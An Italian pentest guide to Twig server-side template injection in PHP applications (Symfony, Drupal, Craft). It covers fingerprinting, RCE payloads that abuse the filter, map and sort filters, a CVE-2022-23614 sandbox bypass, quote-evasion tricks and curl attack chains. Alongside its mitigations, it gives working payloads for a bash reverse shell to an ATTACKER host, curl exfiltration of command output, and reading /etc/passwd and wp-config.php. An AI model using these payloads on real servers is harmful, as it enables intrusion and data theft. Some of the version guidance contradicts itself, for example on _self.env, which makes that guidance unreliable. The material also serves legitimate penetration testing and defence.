---
title: 'Twig SSTI e Sandbox Bypass: RCE in Twig , CMS e Filtri PHP'
slug: twig-ssti-rce
description: 'Twig SSTI ,detection, payload e RCE: fingerprint vs Jinja2, payload per Twig 2.x e 3.x, filter/map/reduce bypass, sandbox escape, CMS Drupal/Craft e mitigazioni'
image: /twig-ssti-server-side-template-injection-rce.webp
draft: false
date: 2026-07-22T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - ssti
  - twig
  - Server-Side Template Injection
---

# Twig SSTI e Sandbox Bypass: Payload, Fingerprint, RCE e Versioni

Twig SSTI ti mette dentro il server PHP di Symfony, Laravel o Drupal — non nel browser della vittima, nel server stesso. Test immediato: `{{7*'7'}}` — se ottieni `49` (non `7777777`), è Twig. Da lì a RCE il passo è breve: `{{['id']|filter('system')}}` funziona sulla stragrande maggioranza delle installazioni Twig 2.x/3.x che trovi nel 2026 — `map`, `reduce` e `sort` sono le alternative se `filter` è bloccato. Il vettore storico `_self.env.registerUndefinedFilterCallback` è morto con Twig 1.x (pre-2016, ormai raro): se lo vedi citato come "il" metodo, la fonte è vecchia. Sandbox attiva? Cerca il CVE della versione target o un oggetto whitelistato con metodi pericolosi.

Twig gira dietro metà del PHP moderno: Symfony lo usa di default, Laravel lo importa via TwigBridge, Drupal 8+ lo usa in ogni tema, Craft CMS lo espone spesso nei pannelli admin. Quando una di queste applicazioni concatena input utente dentro il **sorgente** del template invece di passarlo come variabile, il motore lo interpreta come codice — questo è il momento in cui nasce una **Server-Side Template Injection**. A differenza della XSS il codice gira lato server: filesystem, credenziali, database, tutto raggiungibile.

Fa parte del cluster [SSTI](https://hackita.it/articoli/ssti-server-side-template-injection) e della guida [Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa).

***

## Cos'è una Twig SSTI

La Twig SSTI si verifica quando l'input dell'utente viene concatenato direttamente nel sorgente del template invece di essere passato come variabile al renderer. Twig compila il contenuto dei delimitatori `{{}}` e `{%%}` nel proprio DSL (un linguaggio di espressioni dedicato, poi compilato in PHP) — non esegue PHP arbitrario direttamente. Se l'attaccante controlla quel sorgente, può comunque raggiungere funzioni ed esecuzione di comandi attraverso gli oggetti e i filtri che il DSL espone.

**Attenzione a non confondere due cose diverse**: se l'input finisce nel *sorgente* del template (es. `$twig->createTemplate($_GET['tpl'])`), è vera SSTI. Se l'input sceglie solo il *nome* del template da caricare (es. `$twig->render($_GET['page'].'.twig', $data)`), è un problema di path traversal/LFI — un vettore diverso, non SSTI. Se l'input è passato come *variabile* al render (`$twig->render('hello.twig', ['name' => $_GET['name']])`), di norma non viene rieseguito come template.

### Codice vulnerabile e codice sicuro

```php
// VULNERABILE — input nel SORGENTE del template (vera SSTI)
$template = $twig->createTemplate("Ciao " . $_GET['name'] . "!");
echo $template->render([]);

// VULNERABILE — variante equivalente
echo $twig->createTemplate("Ciao {$_GET['name']}!")->render([]);

// ATTENZIONE — questo NON è SSTI, è path traversal/LFI
$twig->render($_GET['template'], $data);
// ^^^ l'utente sceglie quale FILE caricare, non inietta sorgente Twig

// SICURO — input come variabile nel template
echo $twig->render('hello.html.twig', ['name' => $_GET['name']]);
```

La differenza è sempre la stessa: l'input deve finire nel **sorgente del template** (`createTemplate()` con stringa controllata dall'utente), non essere solo il **nome del file** da caricare o una **variabile** passata al render.

***

## Dove compare davvero nell'ecosistema PHP

### Symfony

Symfony usa Twig come engine di default. Le superfici più comuni sono i controller che usano `renderView()` o `render()` con variabili che finiscono nel template — ma anche le funzionalità di email transazionale, notifiche e template personalizzabili dall'utente.

### Laravel

Laravel ha Blade come engine nativo, ma molte applicazioni usano Twig via pacchetti come `TwigBridge`. Il pattern vulnerabile più comune in Laravel è l'uso di `twig()->render()` con input utente in template string.

### Drupal

Drupal 8+ usa Twig come engine di default per i template dei temi. La superficie tipica è nei **template editabili dall'admin** o nei campi testo che vengono renderizzati come Twig senza sandbox.

### Craft CMS e altri CMS PHP

Craft CMS usa Twig estensivamente per i template, spesso modificabili via pannello admin — un admin compromesso o un insider può iniettare SSTI, e in molti setup la sandbox non è abilitata per default. Statamic invece ha come motore nativo **Antlers** (con Blade come alternativa supportata) — Twig lì non è il default: verifica sempre quale motore di template è realmente in uso prima di applicare payload Twig.

### Superfici tipiche nel 2026

* Funzioni di anteprima email con template modificabili
* Generatori di PDF con template Twig user-controlled
* Pannelli admin con editor di template
* API che accettano `template_body` in JSON
* Plugin e moduli CMS con Twig embedding

***

## Detection e fingerprint Twig

### Polyglot iniziale

Prima di tutto, invia il polyglot su ogni parametro:

```
${{<%[%'"}}%\.
```

Se la risposta cambia o compare un errore, qualche engine ha reagito. A quel punto usa i payload specifici.

### Conferma Twig

```
{{7*7}}       → 49 (Twig o Jinja2, da distinguere dopo)
{{7*'7'}}     → 49 (Twig — NON moltiplica stringhe)
```

Il test `{{7*'7'}}` è il discriminante chiave: Twig restituisce `49`, Jinja2 restituisce `7777777`. Se hai `49`, stai lavorando con Twig (o Nunjucks, ma il contesto PHP esclude quest'ultimo).

### Fingerprint avanzato

```
{{_self}}                 → dal Twig 2.0 in poi (2016+) è il NOME del template, una stringa — non un oggetto
{{_self.env}}             → funziona SOLO su Twig 1.x (pre-2.0): su 2.x/3.x _self è una stringa e non ha .env
{{twig_version()}}        → versione Twig (se la funzione è esposta)
{{constant('Twig\\Environment::VERSION')}} → versione Twig, se la funzione `constant()` è raggiungibile (funziona anche su 2.x/3.x, a differenza di _self.env)
```

Se `{{_self}}` mostra il nome del file template (es. `index.html.twig`), confermi Twig 2.x/3.x. Se invece mostra qualcosa come `__TwigTemplate_...` (un nome di classe compilata), sei sull'oggetto Template di Twig 1.x — versione molto più vecchia e rara nel 2026.

### Rilevamento tramite errori

Gli errori Twig sono verbose e rivelano la versione:

* `Twig_Error_Syntax` → Twig 1.x/2.x
* `Twig\Error\SyntaxError` → Twig 3.x
* `Variable "x" does not exist` → UndefinedError Twig confermato

Usa [Burp Suite](https://hackita.it/articoli/burp-suite/) per intercettare le request e testare i payload nel Repeater. Per la discovery automatica dei parametri usa [OWASP ZAP](https://hackita.it/articoli/owasp-zap/) con active scan. Per identificare il framework e la versione prima di testare usa [Wappalyzer](https://hackita.it/articoli/wappalyzer/) o [WhatWeb](https://hackita.it/articoli/whatweb/) da CLI.

***

## Differenze chiave tra Twig e Jinja2

Twig e [Jinja2](https://hackita.it/articoli/jinja2-ssti-rce) usano gli stessi delimitatori `{{}}` e `{%%}`, ma la logica di exploitation è completamente diversa. I payload non sono intercambiabili.

| Caratteristica     | Twig                                                          | Jinja2                        |
| ------------------ | ------------------------------------------------------------- | ----------------------------- |
| Linguaggio         | PHP                                                           | Python                        |
| `{{7*'7'}}`        | `49`                                                          | `7777777`                     |
| Traversal classi   | Non applicabile                                               | MRO Python                    |
| Vettore principale | filtri (`filter`/`map`/`sort`) — `_self.env` solo su Twig 1.x | `config`, `__class__.__mro__` |
| Sandbox            | Opzionale (disabilitata default)                              | `SandboxedEnvironment`        |
| `config` object    | Non disponibile                                               | Disponibile in Flask          |
| RCE diretta        | Via `exec`/`system` filter                                    | Via `os.popen`                |

**Errore tipico**: usare payload Jinja2 su Twig o viceversa. Non funzionano perché la catena di oggetti è diversa.

***

## `_self`, `env` e oggetti esposti

### `_self` — attenzione alla versione, il comportamento è cambiato

Questo è un punto dove è facile portare avanti un equivoco: `_self` **non significa la stessa cosa** su tutte le versioni Twig.

* **Twig 1.x (pre-2.0, rilasciato nel 2016)**: `_self` è l'istanza dell'oggetto Template corrente, con accesso a `_self.env` (l'Environment).
* **Twig 2.x e 3.x (quello che troverai quasi sempre in un target reale nel 2026)**: `_self` è stato ridefinito come una semplice **stringa** col nome del template. `_self.env` su queste versioni non dà accesso a nessun Environment — semplicemente non esiste più quel comportamento.

```
{{_self}}                 → su 2.x/3.x: nome del template (stringa) | su 1.x: oggetto Template
```

### `_self.env` — vettore storico, solo Twig 1.x

Su installazioni Twig 1.x (rare nel 2026, ma capita su applicazioni molto vecchie mai aggiornate), l'Environment gestisce filtri, funzioni, estensioni e comportamento del renderer. Se `_self.env` è raggiungibile, puoi registrare un callback PHP arbitrario:

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

Il primo payload registra `exec` come handler per filtri non definiti. Il secondo invoca `exec("id")` attraverso il meccanismo dei filtri. **Su Twig 2.x/3.x questo intero vettore non è disponibile**, non perché il metodo `registerUndefinedFilterCallback` sia stato rimosso dal codice sorgente di Twig (esiste ancora), ma perché `_self` su quelle versioni è una stringa e non espone più `.env`. Se testi questo payload su un target moderno, prepara sempre subito i vettori via filtri (sotto), che sono quelli realmente rilevanti oggi.

### Oggetti esposti dall'applicazione

Il contesto del template può includere oggetti custom passati dall'applicazione. In Symfony, per esempio, il contesto spesso include `app` (con `app.user`, `app.request`, `app.session`). In Drupal e altri CMS possono essere esposti oggetti con metodi di accesso al filesystem o al database.

Prima di usare payload generici, enumera cosa è disponibile nel contesto:

```twig
{{dump()}}                → mostra tutte le variabili nel contesto
{{dump(_context)}}        → alternativa esplicita
```

`dump()` richiede che la **Debug Extension** sia abilitata (`debug: true` nella configurazione Symfony/Twig) — non è disponibile di default in produzione. Se non risponde, l'estensione non è attiva: enumera manualmente tentando nomi comuni (`app`, `user`, `request`, `config`).

***

## RCE nelle versioni vulnerabili / configurazioni deboli

> Twig ha avuto due release di sicurezza importanti nel 2026: **3.26.0** (13 advisory corrette, di cui 2 critiche, quasi tutte sulla sandbox) e **3.28.0**. Se il target sembra bloccare tutto quello che segue, verifica la versione — potrebbe essere aggiornato. Testa `{{_self.env.getVersion()}}` prima di scegliere il payload.

### Via `_self.env` — se raggiungibile

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

Non mostra output diretto — `exec()` in PHP non stampa. Usa `passthru`:

```twig
{{_self.env.registerUndefinedFilterCallback("passthru")}}
{{_self.env.getFilter("id")}}
```

### Via filtri pipe (funziona anche quando `_self.env` è protetto)

```twig
{{['id']|filter('system')}}
{{['id']|filter('passthru')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Alternative: `map`, `reduce`, `sort`

Se `filter` è in blacklist, questi spesso non lo sono:

```twig
{{['id']|map('system')|join}}
{{[0]|reduce('system','id')}}
{{['id',1]|sort('system')|join}}
```

### Payload version-gated (senza `_self.env`)

Da PayloadsAllTheThings — funzionano senza bisogno dell'oggetto `Environment`:

```twig
{# Error-Based RCE — Twig <= 1.19 #}
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%}

{# Error-Based RCE — Twig >=1.41, >=2.10, >=3.0 #}
{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}}

{# Boolean-Based RCE — Twig >=1.41, >=2.10, >=3.0 #}
{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}}
```

Verifica sempre la versione prima di scegliere il ramo giusto — un payload per la versione sbagliata fallisce senza dare falsi positivi né falsi negativi chiari.

### CVE-2022-23614 — sandbox bypass via `sort`

```twig
{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%}
```

Boolean-based con lo stesso CVE:

```twig
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }}
```

### Lettura file

```twig
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include("wp-config.php")}}
```

`file_excerpt` non è disponibile in tutti i setup — dipende dalle estensioni caricate.

### Bypass virgolette — offuscamento via `block` e `_charset`

Se le virgolette sono filtrate, sfrutta le variabili built-in `block` e `_charset` per costruire stringhe senza mai scrivere `'` o `"`:

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

Via `_context` con doppio rendering (solo se l'applicazione fa doppio-render del template):

```twig
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

### Contesto reale: campo email con validazione

Un campo che passa per `FILTER_VALIDATE_EMAIL` di PHP può comunque veicolare SSTI se il valore validato finisce nel template:

```
POST /subscribe HTTP/1.1

email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

### Shell inversa

```twig
{{['bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"']|filter('passthru')}}
```

### Blind / esfiltrazione fuori banda

```twig
{{['curl http://ATTACKER/$(id|base64)']|filter('system')}}
{{['sleep 5']|filter('system')}}
{{['nslookup oastify.com']|filter('system')}}
```

Se la risposta arriva con 5 secondi di ritardo, la SSTI è confermata. Per esfiltrazione usa un HTTP callback o DNS (Burp Collaborator).

### Attenzione: false conferme e limiti

**`{{7*7}}` = 49 conferma Twig o Jinja2, non entrambi.** Usa `{{7*'7'}}`: Twig restituisce `49`, Jinja2 restituisce `7777777`. Se il backend è PHP, è Twig. Se è Python, è Jinja2.

**`registerUndefinedFilterCallback` esiste ancora nel sorgente Twig 3.x — ma `_self.env` no.** Il metodo non è stato rimosso dal codice di Twig; è `_self` ad essere stato ridefinito come stringa dal 2.0 in poi, quindi `_self.env` semplicemente non produce un Environment su versioni moderne. Se il target è 2.x/3.x (praticamente sempre nel 2026), passa direttamente ai payload via `filter`/`map`/`sort`.

**Sandbox attiva = errore `SecurityError`.** Se vedi `Twig\Sandbox\SecurityError`, la sandbox è abilitata. Prova CVE-2022-23614 se la versione è vulnerabile, o cerca oggetti whitelistati con metodi pericolosi.

**Verifica sempre la versione prima di assumere un payload "universale".** I payload error/boolean-based sopra sono divisi per range (`<=1.19` vs `>=1.41/2.10/3.0`) perché l'API interna di Twig è cambiata. Un payload per il ramo sbagliato non dà falsi positivi ma nemmeno funziona.

**Contesti blind.** In Drupal, Craft CMS e template email, l'output non è visibile nella response. Usa `{{['sleep 5']|filter('system')}}` per confermare tramite ritardo.

***

## Dalla detection alla RCE in Twig

```bash
# 1. Conferma SSTI
curl -g 'https://TARGET/?name={{7*7}}'
# 49 → engine con sintassi {{ }}

# 2. Distingui da Jinja2
curl -g 'https://TARGET/?name={{7*"7"}}'
# 49 = Twig | 7777777 = Jinja2

# 3. Conferma Twig
curl -g 'https://TARGET/?name={{_self.env}}'
# Se vedi "Twig\Environment" → Twig confermato

# 4. RCE Twig 1.x (solo se il target è eccezionalmente datato — verifica prima con {{_self}})
curl -g 'https://TARGET/?name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}'

# 5. RCE Twig 3.x
curl -g 'https://TARGET/?name={{["id"]|filter("system")}}'
# Se vedi uid=... → RCE confermata

# 6. Alternative se filter è bloccato
curl -g 'https://TARGET/?name={{["id"]|map("system")|join}}'
curl -g 'https://TARGET/?name={{["id",0]|sort("system")}}'
```

Se al punto 5 vedi `uid=...` → il server è compromesso. Se ricevi `SecurityError` → la sandbox è attiva, cerca oggetti whitelistati.

***

## Sandbox mode: cosa blocca e cosa no

### Com'è strutturata la sandbox Twig

La sandbox Twig è un meccanismo opzionale che va abilitato esplicitamente nella configurazione. Quando attiva, definisce una **whitelist** di:

* Tag permessi (es. `if`, `for`, `set`)
* Filtri permessi (es. `upper`, `lower`, `date`)
* Funzioni permesse
* Metodi permessi per ogni classe
* Proprietà permesse per ogni classe

Se qualcosa non è in whitelist, viene bloccato con `Twig\Sandbox\SecurityError`.

### Configurazione sandbox

```php
// Abilitare la sandbox in Twig
use Twig\Sandbox\SecurityPolicy;
use Twig\Extension\SandboxExtension;

$policy = new SecurityPolicy(
    ['if', 'for'],           // tag permessi
    ['upper', 'lower'],      // filtri permessi
    [],                       // metodi permessi
    [],                       // proprietà permesse
    ['date', 'range']        // funzioni permesse
);

$sandbox = new SandboxExtension($policy, true); // true = sandbox su tutti i template
$twig->addExtension($sandbox);
```

### Cosa blocca la sandbox

Con una policy corretta, la sandbox blocca:

* `_self.env.registerUndefinedFilterCallback(...)` → metodo non in whitelist
* `filter('system')` → filtro non in whitelist
* Accesso a metodi di classi non autorizzate
* Chiamate a funzioni PHP native non esplicitamente permesse

### Cosa NON blocca (attenzione)

La sandbox **non è una soluzione completa**. I rischi residui:

* **Callable esposti dall'app**: se l'applicazione passa al contesto oggetti con metodi pericolosi e quelli sono in whitelist, sono exploitabili
* **Bypass tramite oggetti custom**: classi PHP con metodi che eseguono codice possono essere whitelistate per errore
* **Advisory 2024**: Twig ha pubblicato security advisory nel 2024 che includono potenziali vettori di bypass. Aggiorna sempre all'ultima versione e non assumere che una versione vecchia con sandbox sia sicura
* **Sandbox disabilitata per default**: se non l'hai configurata esplicitamente, non è attiva

> **Regola pratica**: la sandbox Twig va abilitata *ogni volta* che includi template non fidati — template caricati da database, input utente, o file system non controllato. Non è sufficiente "usare Twig" per essere al sicuro.

***

## CMS, plugin e template custom

### Drupal

Drupal 8+ usa Twig per i template dei temi. La superficie principale è nei **template editabili via pannello admin** (se il modulo è installato) e nei **field formatter** che renderizzano testo come Twig. In Drupal la sandbox non è attiva per default sui template di tema.

Cerca: moduli come `twig_tweak`, template custom in `/templates/`, funzionalità "Twig Field Value".

### Craft CMS

Craft CMS usa Twig estensivamente. I template sono editabili via pannello admin e non usano sandbox per default. Un account admin compromesso è equivalente a SSTI → RCE.

### Statamic

Statamic usa **Antlers** come linguaggio di template nativo (con supporto a Blade) — Twig non è il motore di default. Se il pentest riguarda Statamic, verifica prima quale linguaggio è effettivamente attivo invece di assumere Twig; i payload di questa guida si applicano solo se trovi effettivamente Twig esposto.

### Plugin WordPress con Twig

Alcuni plugin WordPress (Timber, Twig for WordPress) portano Twig nell'ecosistema WP. Se il plugin permette template custom editabili via admin, la superficie di attacco esiste.

### Pattern da cercare nei CMS

```bash
# File Twig nel progetto
find . -name "*.twig" -o -name "*.html.twig"

# Uso di createTemplate o renderFromString nel codice
grep -r "createTemplate\|renderFromString\|renderTemplate" --include="*.php"

# Template da input utente o database
grep -r "\$_GET\|\$_POST\|\$request->get" --include="*.twig"
```

***

## Mitigazioni corrette

### Mai passare input utente come template

```php
// SBAGLIATO
$twig->render($_GET['template'], $data);
$twig->createTemplate("Ciao " . $input)->render([]);

// CORRETTO
$twig->render('hello.html.twig', ['name' => $input]);
```

### Abilitare la sandbox quando necessario

Se devi permettere template custom (da database, da utenti), abilita sempre la sandbox con policy restrittiva:

```php
$policy = new SecurityPolicy(
    $allowedTags,
    $allowedFilters,
    $allowedMethods,
    $allowedProperties,
    $allowedFunctions
);
$twig->addExtension(new SandboxExtension($policy, true));
```

Non esporre mai nel contesto oggetti con metodi pericolosi.

### Aggiornare Twig

Twig ha una storia di patch di sicurezza. Mantieni sempre l'ultima versione stabile — soprattutto per fix relativi alla sandbox.

```bash
composer show twig/twig  # versione installata
composer update twig/twig # aggiorna
```

### Non esporre oggetti pericolosi nel contesto

Anche con sandbox attiva, analizza cosa passi nel contesto del template. Ogni oggetto con metodi di I/O, esecuzione o accesso al filesystem è potenzialmente pericoloso se whitelistato.

### Review del codice

Cerca questi pattern nel codebase:

```bash
grep -r "createTemplate\|renderFromString" --include="*.php"
grep -r "\$twig->render.*\$_" --include="*.php"
grep -r "registerUndefinedFilterCallback" --include="*.php"
```

***

## Checklist pentest Twig SSTI

### Detection

* Inviare polyglot `${{<%[%'"}}%\.` su ogni parametro
* Testare `{{7*7}}` — output `49` conferma engine compatibile
* Testare `{{7*'7'}}` — output `49` (non `7777777`) conferma Twig
* Testare `{{_self}}` — output `__TwigTemplate_...` conferma Twig

### Fingerprint e versione

* Raccogliere errori verbose per identificare la versione (Twig 1/2/3)
* Usare [Wappalyzer](https://hackita.it/articoli/wappalyzer/) o [WhatWeb](https://hackita.it/articoli/whatweb/) per identificare framework PHP e versione Twig
* Verificare `{{_self.env}}` per accesso all'Environment
* Verificare `{{dump()}}` per enumerare oggetti nel contesto

### Exploitation

* Se `{{_self}}` mostra un oggetto (non una stringa) → sei su Twig 1.x, testare `registerUndefinedFilterCallback("passthru")` + `getFilter("id")`
* Twig 3.x: testare `['id']|filter('system')`
* Verificare se sandbox è attiva (SecurityError → sandbox presente)
* Con sandbox attiva: analizzare oggetti nel contesto per metodi whitelistati pericolosi

### Reporting

* Documentare parametro vulnerabile e request completa
* Indicare versione Twig e presenza/assenza sandbox
* Allegare PoC con `id` o `whoami`
* Descrivere impatto: RCE, file read, credential leak

***

## FAQ

**Twig SSTI e Jinja2 SSTI sono la stessa cosa?**
No — usano gli stessi delimitatori ma payload completamente diversi. La logica di exploitation di Jinja2 (traversal MRO Python) non si applica a Twig (PHP). Vedi il confronto nella [guida SSTI](https://hackita.it/articoli/ssti-server-side-template-injection) e la [guida Jinja2 SSTI to RCE](https://hackita.it/articoli/jinja2-ssti-rce).

**La sandbox Twig rende sicura l'applicazione?**
Non completamente. La sandbox riduce la superficie ma non elimina il rischio — dipende dalla policy configurata, dagli oggetti esposti nel contesto e dalla versione. Non assumere mai che "usa la sandbox" significhi "è sicuro".

**Twig 3.x è immune alla SSTI?**
No. `registerUndefinedFilterCallback` è ancora nel sorgente di Twig 3.x — non è stato rimosso, come spiegato più sopra. Il problema è la raggiungibilità di `_self.env`, non l'esistenza del metodo. Esistono comunque vettori alternativi indipendenti da `_self.env`, come `filter('system')`, `map`, `sort` e i payload version-gated. L'impatto dipende sempre dalla configurazione specifica, mai dalla sola major version.

**Come identifico la versione Twig target?**
Analizza gli errori verbose (il namespace cambia tra 1.x/2.x e 3.x), usa [WhatWeb](https://hackita.it/articoli/whatweb/) o guarda il `composer.lock` se hai accesso al filesystem.

***

Satellite della [guida SSTI](https://hackita.it/articoli/ssti-server-side-template-injection) e della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [Jinja2 SSTI to RCE](https://hackita.it/articoli/jinja2-ssti-rce), [FreeMarker SSTI](https://hackita.it/articoli/freemarker-ssti-rce), [Thymeleaf SSTI](https://hackita.it/articoli/thymeleaf-ssti-rce), [Burp Suite](https://hackita.it/articoli/burp-suite/), [OWASP ZAP](https://hackita.it/articoli/owasp-zap/).

**Riferimenti esterni**: [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection) · [Twig Security Documentation](https://twig.symfony.com/doc/3.x/api.html#sandbox-extension) · [OWASP WSTG — SSTI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
